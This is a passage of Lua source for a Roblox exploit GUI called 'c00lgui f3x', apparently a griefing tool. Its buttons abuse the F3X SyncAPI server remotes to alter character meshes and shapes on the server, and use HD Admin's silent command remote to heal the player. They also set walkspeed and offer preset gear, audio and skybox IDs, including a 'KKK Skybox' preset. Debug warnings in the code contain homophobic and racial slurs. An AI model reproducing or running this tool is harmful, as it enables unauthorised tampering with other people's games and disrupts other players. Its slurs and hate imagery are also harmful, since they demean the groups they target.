					local newCF = humanrFr.CFrame * CFrame.new(0, -4.2, 0)
					MovePart(pad, newCF)
				end
			end)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Head Shake"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Head Shake"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
	
			-- find shit
			local tool
			for _, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
			if not tool then
				warn("ไม่พบ SyncAPI Tool!")
				return
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
	
			local head = char:FindFirstChild("Head")
			if not head then
				warn("fuck fagz")
				return
			end
			local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
			if not headMesh then
				warn("nigga")
				return
			end
	
	
			local hats = {}
			for _, hat in pairs(char:GetChildren()) do
				if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
					local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
					if handleMesh then
						table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
					end
				end
			end
	
	
			local amplitude = 0.4
			local frequency = 6 
			local t = 0
	
			local RunService = game:GetService("RunService")
			RunService.RenderStepped:Connect(function(dt)
				t = t + dt * frequency
				local offsetValue = math.sin(t) * amplitude
	
	
				local partsToSync = {
					{Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}
				}
				for _, h in pairs(hats) do
					table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
				end
	
				remote:InvokeServer("SyncMesh", partsToSync)
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Heal"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Heal"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";health me 20")
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Mesh Disco"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Mesh Disco"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
	
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
	
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
	
			local tool
			for _, v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
	
			if not tool then
				for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
					if v.Name == "SyncAPI" then
						tool = v.Parent
						break
					end
				end
			end
	
			if not tool then return end
			local remote = tool.SyncAPI.ServerEndpoint
	
			local colors = {
				Color3.fromRGB(255, 0, 0),
				Color3.fromRGB(255, 165, 0),
				Color3.fromRGB(255, 255, 0),
				Color3.fromRGB(0, 255, 0),
				Color3.fromRGB(0, 0, 255),
				Color3.fromRGB(128, 0, 128),
				Color3.fromRGB(255, 105, 180)
			}
	
			local shapes = {
				"Block",
				"Cylinder",
				"Ball",
				"Wedge",
				"Head",
				"Mesh"
			}
	
			local function applyShape(part, shapeType)
	
				for _, v in ipairs(part:GetChildren()) do
					if v:IsA("SpecialMesh") then
						v:Destroy()
					end
				end
	
				if shapeType == "Block" then
					part.Shape = Enum.PartType.Block
	
				elseif shapeType == "Cylinder" then
					part.Shape = Enum.PartType.Cylinder
	
				elseif shapeType == "Ball" then
					part.Shape = Enum.PartType.Ball
	
				elseif shapeType == "Wedge" then
					part.Shape = Enum.PartType.Wedge
	
				elseif shapeType == "Head" then
					local mesh = Instance.new("SpecialMesh")
					mesh.MeshType = Enum.MeshType.Head
					mesh.Parent = part
	
				elseif shapeType == "Mesh" then
					local mesh = Instance.new("SpecialMesh")
					mesh.MeshType = Enum.MeshType.Sphere
					mesh.Scale = Vector3.new(1.2, 1.2, 1.2)
					mesh.Parent = part
				end
			end
	
			task.spawn(function()
				while char.Parent do
					local partsToSync = {}
	
					for _, part in ipairs(char:GetChildren()) do
						if part:IsA("BasePart") then
							part.Color = colors[math.random(1, #colors)]
							local shape = shapes[math.random(1, #shapes)]
							applyShape(part, shape)
	
							table.insert(partsToSync, {
								Part = part,
								Color = part.Color,
								Shape = part.Shape
							})
						end
					end
	
					remote:InvokeServer("SyncParts", partsToSync)
	
					task.wait(0.25)
				end
			end)
		end)
	
	
	
	
	
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Set Walkspeed"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Set Walkspeed"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = frame.Settings.Page2["Walkspeed Amount"].TextBox.Text	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.48,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,231)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,231)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		local title = Instance.new("TextLabel")
		title.Parent = misc
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Misc."
		title.TextColor3 = whit
		local title = Instance.new("TextLabel")
		title.Parent = localp
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "LocalPlayer"
		title.TextColor3 = whit
		-- Page 3 End --
		-- Page 4 --
		button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Chop Suey"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Chop Suey"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Music ID"].TextBox.Text = 147407900
		end)
		--
		button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Electro Sp00k"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Electro Sp00k"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Music ID"].TextBox.Text = 136247552074672	
			frame.Settings.Page1["Music Pitch"].TextBox.Text = 0.140
		end)
		--
		button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Scream"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Scream"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Music ID"].TextBox.Text = 138097458	
		end)
		--
		button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Wonga"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Wonga"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Music ID"].TextBox.Text = 100792696468630	
			frame.Settings.Page1["Music Pitch"].TextBox.Text = 0.141	
		end)
		--
		button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 3
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pmi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
	
		-- Preset Images --
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Team c00lkidd Logo 1"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "KKK Skybox"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 425124566723	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Team c00lkidd Logo 2"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Team c00lkidd Logo 2"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 129175238519301	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Thomas"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Thomas"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 160456772	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "c00lkidd"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "c00lkidd"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 121798374734425	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "SadRc7"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "SkrubzL0rd"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 96612613378164
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.48,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,231)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = psd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,231)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
	
		local title = Instance.new("TextLabel")
		title.Parent = pmi
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Preset Music IDs"
		title.TextColor3 = whit
		title.TextWrapped = true
		local title = Instance.new("TextLabel")
		title.Parent = psd
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Preset Skybox/Decal IDs"
		title.TextColor3 = whit
		--page 5--
		local t3xt = Instance.new("TextLabel")
		t3xt.Parent = edn
		t3xt.BackgroundColor3 = blak
		t3xt.BorderColor3 = rede
		t3xt.BorderSizePixel = 3
		t3xt.Name = "Empty"
		t3xt.Position = UDim2.new(0,0,0,0)
		t3xt.Size = UDim2.new(1,0,1,0)
		t3xt.ZIndex = 2
		t3xt.Font = tef
		t3xt.FontSize = "Size14"
		t3xt.Text = "Thank you for using c00lgui f3x! Addons Not Coming soon!  dont Post Ideas in the Thread!!! --skyl0rd"
		t3xt.TextColor3 = whit
		t3xt.TextWrapped = true
		t3xt.TextYAlignment = "Top"
	
		-- Preset Gear IDs --
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Airstrike"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Airstrike"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 88885539
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Dual Darkhearts"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Dual Darkhearts"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 108149175
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Dual Venomshanks"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Dual Venomshanks"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 158069180
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Ghostfire Sword"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Ghostfire Sword"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 64220933	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Gravity Coil"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Gravity Coil"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 16688968
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Hyperbike"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Hyperbike"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 130113061	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Icedagger"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Icedagger"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 83704165
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Linked Sword"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Linked Sword"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 125013769		
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.48,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
		local button = Instance.new("TextButton")
		button.Parent = pgi
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,231)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		--
	
	
	
		--Settings--
		local pge1 = Instance.new("Frame")
		pge1.Parent = page
		pge1.BorderColor3 = rede
		pge1.BackgroundColor3 = blak
		pge1.BorderSizePixel = 3
		pge1.Name = "Page1"
		pge1.Position = UDim2.new(0,0,0,83)
		pge1.Size = UDim2.new(1,0,1,-83)
		pge1.ZIndex = 1
	
		local pge2 = Instance.new("Frame")
		pge2.Parent = page
		pge2.BorderColor3 = rede
		pge2.BackgroundColor3 = blak
		pge2.BorderSizePixel = 3
		pge2.Name = "Page2"
		pge2.Position = UDim2.new(0,0,0,83)
		pge2.Size = UDim2.new(1,0,1,-83)
		pge2.ZIndex = 1
		pge2.Visible = false
		local lft = Instance.new("TextButton")
		lft.Parent = page
		lft.BorderColor3 = rede
		lft.BackgroundColor3 = blak
		lft.BorderSizePixel = 3
		lft.Name = ">"
		lft.Position = UDim2.new(0.5,3,0,40)
		lft.Size = UDim2.new(0.5,-3,0,40)
		lft.ZIndex = 1
		lft.Font = tef
		lft.FontSize = "Size48"
		lft.Text = ">"
		lft.TextColor3 = whit
		lft.MouseButton1Down:connect(function()
			if pge1.Visible == true then
				pge1.Visible = false
				pge2.Visible = true
			elseif pge2.Visible == true then
				pge2.Visible = false
				pge1.Visible = true
			end	
		end)
		local rgt = Instance.new("TextButton")
		rgt.Parent = page
		rgt.BorderColor3 = rede
		rgt.BackgroundColor3 = blak
		rgt.BorderSizePixel = 3
		rgt.Name = "<"
		rgt.Position = UDim2.new(0,0,0,40)
		rgt.Size = UDim2.new(0.5,0,0,40)
		rgt.ZIndex = 1
		rgt.Font = tef
		rgt.FontSize = "Size48"
		rgt.Text = "<"
		rgt.TextColor3 = whit
		rgt.MouseButton1Down:connect(function()
			if pge1.Visible == true then
				pge1.Visible = false
				pge2.Visible = true
			elseif pge2.Visible == true then
				pge2.Visible = false
				pge1.Visible = true
			end	
		end)
	
